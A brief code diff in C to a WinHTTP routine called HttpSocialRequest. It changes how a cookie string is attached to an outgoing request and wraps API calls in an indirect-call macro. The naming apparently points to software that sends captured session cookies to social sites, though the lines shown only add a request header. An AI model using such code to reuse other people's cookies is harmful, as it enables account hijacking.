@@ -49,7 +49,15 @@ DWORD HttpSocialRequest(WCHAR *Host, WCHAR *verb, WCHAR *resource, DWORD port, B
 		WinHttpCloseHandle(hConnect);
 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 	}
-	if (!FNC(WinHttpSendRequest)(hRequest, cookies_w, -1L, s_buffer, sbuf_len, 0, NULL))  {
+
+	if (!FNC(WinHttpAddRequestHeaders)(hRequest, cookies_w, -1, WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD)) {
+		SAFE_FREE(cookies_w);
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	}
+
+	if (!FNC(WinHttpSendRequest)(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, s_buffer, sbuf_len, 0, NULL))  {
 		SAFE_FREE(cookies_w);
 		WinHttpCloseHandle(hRequest);
 		WinHttpCloseHandle(hConnect);
